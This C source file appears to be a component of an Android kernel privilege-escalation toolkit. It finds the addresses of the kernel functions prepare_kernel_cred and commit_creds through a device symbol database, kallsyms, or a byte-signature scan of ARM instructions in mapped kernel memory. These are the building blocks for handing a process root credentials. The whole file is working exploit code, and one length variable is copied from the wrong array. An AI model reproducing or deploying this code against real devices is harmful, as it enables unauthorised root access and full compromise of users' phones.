#include <errno.h>
#include <stdio.h>

#include "cred.h"
#include "mm.h"
#include "kallsyms.h"
#include "device_database/device_database.h"

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

bool
setup_prepare_kernel_cred_address(void)
{
  if (prepare_kernel_cred) {
    return true;
  }

  prepare_kernel_cred = (prepare_kernel_cred_t)device_get_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred));

  if (!prepare_kernel_cred && kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
  }

  return !!prepare_kernel_cred;
}

bool
setup_commit_creds_address(void)
{
  if (commit_creds) {
    return true;
  }

  commit_creds = (commit_creds_t)device_get_symbol_address(DEVICE_SYMBOL(commit_creds));

  if (!commit_creds && kallsyms_exist()) {
    commit_creds = kallsyms_get_symbol_address("commit_creds");
  }

  return !!commit_creds;
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);

static bool
find_prepare_kernel_cred_address_in_memory(void *mem, size_t length)
{
  void *address;

  if (prepare_kernel_cred) {
    return true;
  }

  address = (prepare_kernel_cred_t)memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!address) {
    return false;
  }

  prepare_kernel_cred = (prepare_kernel_cred_t)convert_to_kernel_address(address, mem);
  return true;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);

static bool
find_commit_creds_address_in_memory(void *mem, size_t length)
{
  void *address;

  if (commit_creds) {
    return true;
  }

  address = (commit_creds_t)memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!address) {
    return false;
  }

  commit_creds = (commit_creds_t)convert_to_kernel_address(address, mem);
  return true;
}

bool
setup_prepare_kernel_cred_address_in_memory(void *mem, size_t length)
{
  if (prepare_kernel_cred) {
    return true;
  }

  return find_prepare_kernel_cred_address_in_memory(mem, length);
}

bool
setup_commit_creds_address_in_memory(void *mem, size_t length)
{
  if (commit_creds) {
    return true;
  }

  return find_commit_creds_address_in_memory(mem, length);
}
